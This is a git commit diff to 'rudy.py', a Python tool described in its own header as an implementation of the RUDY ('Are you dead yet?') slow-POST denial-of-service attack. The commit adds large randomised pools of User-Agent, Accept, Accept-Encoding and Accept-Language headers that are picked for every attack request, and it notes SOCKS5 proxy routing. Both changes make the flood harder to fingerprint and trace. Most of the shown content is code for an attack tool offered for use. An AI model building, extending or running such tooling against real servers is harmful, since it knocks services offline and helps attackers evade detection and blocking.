e4dd2affed26799132cc5b49c52266877376c7d0
SergiDelta <sergiogl11042@gmail.com>
2021-09-01 12:49:46 +0200

    Version 1.1, added new headers

--- rudy.py
+++ rudy.py
@@ -9,9 +9,9 @@
 #                                                                #
 #  Github: https://github.com/SergiDelta/rudy                    #
 #                                                                #
-#  Date: August 2021                                             #
+#  Date: September 2021                                          #
 #                                                                #
-#  Version: 1.0                                                  #
+#  Version: 1.1                                                  #
 #                                                                #
 #  Description: Implementation of RUDY (Are you dead yet?)       #
 #               Denial of Service attack in Python. It is a      #
@@ -70,7 +70,7 @@ def print_rudy():
    print("  | |\ \  | |_| | | |/ /| |___| | | | |/ /    | | | |___  | |  |_|  ")
    print("  \_| \_|  \___/  |___/ \____/\_| |_/___/     \_/ \____/  \_/  (_)  ")
    print()
-   print("            rudy 1.0 https://github.com/SergiDelta/rudy             ")
+   print("            rudy 1.1 https://github.com/SergiDelta/rudy             ")
    print()
 
 
@@ -97,8 +97,8 @@ def generate_http_req(method, path, headers, version="HTTP/1.1"):
 def cli():
    parser = argparse.ArgumentParser(
       prog="rudy",
-      description="%(prog)s 1.0 https://github.com/SergiDelta/rudy . " + 
-      "Implementation of R.U.D.Y (Are you dead yet?) " + 
+      description="%(prog)s 1.1 https://github.com/SergiDelta/rudy . " + 
+      "Implementation of RUDY (Are you dead yet?) " + 
       "Denial of Service attack in Python."
    )
    parser.add_argument(
@@ -122,7 +122,7 @@ def cli():
    )
    parser.add_argument(
       "-x", "--proxy",
-      help="Send requests through a proxy, e.g: 127.0.0.1:8080"
+      help="Send requests through a Socks5 proxy, e.g: 127.0.0.1:1080"
    )
    parser.add_argument(
       "-v", "--verbose",
@@ -132,7 +132,7 @@ def cli():
    parser.add_argument(
       "--version",
       action="version",
-      version="%(prog)s version 1.0 https://github.com/SergiDelta/rudy ."
+      version="%(prog)s version 1.1 https://github.com/SergiDelta/rudy ."
    )
    parser.add_argument(
       "url",
@@ -186,7 +186,7 @@ def main():
                proxy[1] = int(proxy[1])
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy[0], proxy[1], True)
             except:
-               logger.error("Can not set default proxy to " + args.proxy)
+               logger.error("Cannot set default proxy to " + args.proxy)
                sys.exit(1)
          
 
@@ -209,32 +209,134 @@ def main():
          "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
          "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
+         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
+         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
+         "User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
+         "User-Agent: Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
+         "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
+         "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
+         "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
+         "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
+         "User-Agent: Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
+         "User-Agent: Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
+         "User-Agent: Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
          "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:69.2.1) Gecko/20100101 Firefox/69.2",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.66.18) Gecko/20177177 Firefox/45.66.18",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
+         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
          "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
          "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
+         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0",
          "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+         "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
          "User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
          "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
          "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+         "User-Agent: Mozilla/5.0 (X11; Linux ppc64le; rv:75.0) Gecko/20100101 Firefox/75.0",
+         "User-Agent: Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0",
+         "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0",
+         "User-Agent: Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0",
          "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
+         "User-Agent: Mozilla/5.0 (X11; Ubuntu i686; rv:52.0) Gecko/20100101 Firefox/52.0",
+         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
+         "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
+         "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
+         "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
+         "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
+         "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
+         "User-Agent: Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
+         "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
+         "User-Agent: Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
+         "User-Agent: Mozilla/5.0 (Linux; Android 4.2.1; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
+         "User-Agent: Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
+         "User-Agent: Mozilla/5.0 (Android; Tablet; rv:18.0) Gecko/18.0 Firefox/18.0"
+
+      ]
+
+      accept_header_list = [
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "Accept: text/html,application/xhtml+xml,image/jxr,*/*"
+
+      ]
+
+      accept_enc_list = [
+         "Accept-Encoding: gzip, deflate, br",
+         "Accept-Encoding: gzip, deflate, br",
+         "Accept-Encoding: gzip, deflate, br",
+         "Accept-Encoding: gzip, deflate, br",
+         "Accept-Encoding: gzip, deflate, br",
+         "Accept-Encoding: gzip, deflate, br",
+         "Accept-Encoding: gzip, deflate, br",
+         "Accept-Encoding: gzip",
+         "Accept-Encoding: gzip",
+         "Accept-Encoding: gzip",
+         "Accept-Encoding: gzip, compress, br",
+         "Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
+         "Accept-Encoding: gzip,deflate,sdch",
+         "Accept-Encoding: *"
+
+      ]
+
+      accept_lan_list = [
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: en-US,en,q=0.5",
+         "Accept-Language: zh-CN,zh;q=0.8",
+         "Accept-Language: zh-CN,zh;q=0.8",
+         "Accept-Language: zh-CN,zh;q=0.8",
+         "Accept-Language: zh-CN,zh;q=0.8",
+         "Accept-Language: zh-CN,zh;q=0.8",
+         "Accept-Language: zh-CN,zh;q=0.8",
+         "Accept-Language: zh-CN,zh;q=0.8",
+         "Accept-Language: zh-CN,zh;q=0.8",
+         "Accept-Language: pt-BR,pt,q=0.5",
+         "Accept-Language: pt-BR,pt,q=0.5",
+         "Accept-Language: pt-BR,pt,q=0.5",
+         "Accept-Language: pt-BR,pt,q=0.5",
+         "Accept-Language: es-MX,es,q=0.5",
+         "Accept-Language: es-MX,es,q=0.5",
+         "Accept-Language: es-MX,es,q=0.5"
+
       ]
 
       default_headers = [
-         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9," + 
-         "*/*;q=0.8",
-         "Accept-Encoding: *",
-         "Accept-Language: en-US,en,q=0.5",
          "Connection: keep-alive",
          "Cache-Control: max-age=0"
       ]
+
       content_type_header = "Content-Type: application/x-www-form-urlencoded"
       content_length_header = "Content-Length: " + str(args.length)
 
@@ -248,6 +350,9 @@ def main():
             list_of_headers = []
             list_of_headers.append(host_header)
             list_of_headers.append(random.choice(user_agents))
+            list_of_headers.append(random.choice(accept_header_list))
+            list_of_headers.append(random.choice(accept_enc_list))
+            list_of_headers.append(random.choice(accept_lan_list))
             list_of_headers.extend(default_headers)
             list_of_headers.append(content_type_header)
             list_of_headers.append(content_length_header)
@@ -275,6 +380,9 @@ def main():
                list_of_headers = []
                list_of_headers.append(host_header)
                list_of_headers.append(random.choice(user_agents))
+               list_of_headers.append(random.choice(accept_header_list))
+               list_of_headers.append(random.choice(accept_enc_list))
+               list_of_headers.append(random.choice(accept_lan_list))
                list_of_headers.extend(default_headers)
                list_of_headers.append(content_type_header)
                list_of_headers.append(content_length_header)
@@ -294,5 +402,5 @@ def main():
 
 if __name__ == "__main__":
    main()
-
-
+ 
+ 
